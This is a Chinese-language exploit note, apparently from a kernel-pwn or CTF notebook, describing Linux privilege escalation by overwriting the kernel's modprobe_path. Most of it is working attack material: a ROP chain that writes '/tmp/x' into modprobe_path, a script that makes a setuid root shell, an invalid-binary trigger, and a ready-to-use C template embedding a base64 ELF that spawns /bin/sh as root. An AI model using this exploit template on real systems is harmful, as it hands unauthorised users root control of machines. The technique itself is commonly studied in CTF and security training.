# modprobe_path提权

利用前提 : 泄露地址和任意地址写

## 攻击

泄露modprobe_path的地址，其值是一个字符串

```sh
~ # cat /proc/kallsyms | grep modprobe_path
ffffffff82c91540 D modprobe_path
```

修改`modprobe_path`的值为`/tmp/`

```asm
pop rax; ret
modprobe_path_addr
pop rdi; ret
0x782f706d742f(/tmp/x)
mov qword ptr [rax], rdi; ret

// 确保内核不会崩溃
pop rdi; ret;
0x7fffffff
msleep
```

设置`/tmp/x`文件的内容为

```sh
#!/bin/sh
chown 0:0 /tmp/sh
chmod u+s /tmp/sh
```

之后，如果内核运行一个错误的文件，就会以root权限运行`/tmp/x`

创建一个错误文件

```sh
echo -ne "\xff\xff\xff\xff" > /tmp/err
```

设置`/tmp/sh`文件为获取`root`的程序，详见`sh.fasm`或`sh.nasm`

运行`/tmp/err`, 内核会通过`modprobe_path`以root权限调用`/tmp/x`，`/tmp/x`会给`/tmp/sh`s权限，然后用户运行`/tmp/sh`即可获得`root`权限

## 快速模板

### C

```C
// 创建x文件，用于modprobe触发
char content[0x200] = {0};
sprintf(content,
        "#!/bin/sh\n"
        "echo 'f0VMRgIBAQMAAAAAAAAAAAIAPgABAAAAyBBAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAACAEAAAAAAAAEAAAAGAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAyAAAAAAAAADIAAAAAAAAAAAQAAAAAAAAAQAAAAUAAADIAAAAAAAAAMgQQAAAAAAAyBBAAAAAAAA4AAAAAAAAADgAAAAAAAAAABAAAAAAAAAvYmluL3NoALAAQAAAAAAAAAAAAAAAAABIMf9IMfa4agAAAA8FSDH/SDH2uHEAAAAPBUiNPcfv//9IjTXI7///SDHAsDsPBbg8AAAAMf8PBQ==' | base64 -d > %s\n"
        "chown 0:0 %s\n"
        "chmod u+s %s\n",
        "/tmp/x", "/tmp/x", "/tmp/x");

// 写入x文件
int fd = open("/tmp/x", O_WRONLY | O_CREAT | O_NOCTTY | O_NONBLOCK, 0755);
write(fd, content, strlen(content));
close(fd);

// 写入错误的执行文件
fd = open("/tmp/err", O_WRONLY | O_CREAT | O_NOCTTY | O_NONBLOCK, 0755);
write(fd, "\xff\xff\xff\xff", 4);
close(fd);

// 触发modprobe，修改x权限并写入x
system("/tmp/err");

// 获取root
system("/tmp/x");
```

### 使用demo模板

```C
kernel_modprobe_create_fake_modprobe("/tmp/x", "/tmp/err", true);
// system("/tmp/err");
// system("/tmp/x");
```
